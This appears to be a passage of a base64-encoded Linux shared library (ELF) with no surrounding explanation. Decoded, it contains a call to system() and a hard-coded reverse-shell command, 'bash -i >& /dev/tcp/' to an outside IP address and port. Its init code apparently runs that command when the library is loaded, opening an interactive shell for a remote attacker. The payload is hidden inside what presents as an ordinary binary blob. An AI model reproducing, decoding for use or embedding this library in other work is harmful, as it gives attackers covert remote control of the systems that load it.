Ac3lzdGVtAGxpYmMuc28uNgBHTElCQ18yLjIuNQAAAAEAAgABAAEAAgABAAEAAQBkAAAAEAAAAAAAAAB1GmkJAAACAG4AAAAAAAAA8D0AAAAAAAAIAAAAAAAAAAARAAAAAAAAAD4AAAAAAAAIAAAAAAAAAMAQAAAAAAAACEAAAAAAAAAIAAAAAAAAAAhAAAAAAAAA+D0AAAAAAAABAAAABgAAAAAAAAAAAAAAyD8AAAAAAAAGAAAAAQAAAAAAAAAAAAAA0D8AAAAAAAAGAAAAAwAAAAAAAAAAAAAA2D8AAAAAAAAGAAAABAAAAAAAAAAAAAAA4D8AAAAAAAAGAAAABQAAAAAAAAAAAAAAAEAAAAAAAAAHAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXFLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXKLwAA/yXMLwAADx9AAP8lyi8AAGgAAAAA6eD/////JZovAABmkAAAAAAAAAAASI09uS8AAEiNBbIvAABIOfh0FUiLBV4vAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI09iS8AAEiNNYIvAABIKf5IifBIwe4/SMH4A0gBxkjR/nQUSIsFLS8AAEiFwHQI/+BmDx9EAADDDx+AAAAAAPMPHvqAPUUvAAAAdStVSIM9Ci8AAABIieV0DEiLPSYvAADoWf///+hk////xgUdLwAAAV3DDx8Aww8fgAAAAADzDx766Xf///9VSInlSI0F7A4AAEiJx+gU////kF3DAEiD7AhIg8QIwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzQzLjE0My4xOTIuMTkvMTE0NSAwPiYxJwAAAAEbAzskAAAAAwAAAOjv//9AAAAACPD//2gAAADR8P//gAAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAKDv//8gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAACY7///CAAAAAAAAAAAAAAAHAAAAFwAAABJ8P//FgAAAABBDhCGAkMNBlEMBwgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEAAAAAAAAAAAAAAAAAAMAQAAAAAAAAAQAAAAAAAABkAAAAAAAAAAwAAAAAAAAAABAAAAAAAAANAAAAAAAAACARAAAAAAAAGQAAAAAAAADwPQAAAAAAABsAAAAAAAAAEAAAAAAAAAAaAAAAAAAAAAA+AAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAYAIAAAAAAAAFAAAAAAAAADADAAAAAAAABgAAAAAAAACIAgAAAAAAAAoAAAAAAAAAegAAAAAAAAALAAAAAAAAABgAAAAAAAAAAwAAAAAAAADoPwAAAAAAAAIAAAAAAAAAGAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAACYBAAAAAAAAAcAAAAAAAAA2AMAAAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAP7//28AAAAAuAMAAAAAAAD///9vAAAAAAEAAAAAAAAA8P//bwAAAACqAwAAAAAAAPn//28AAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA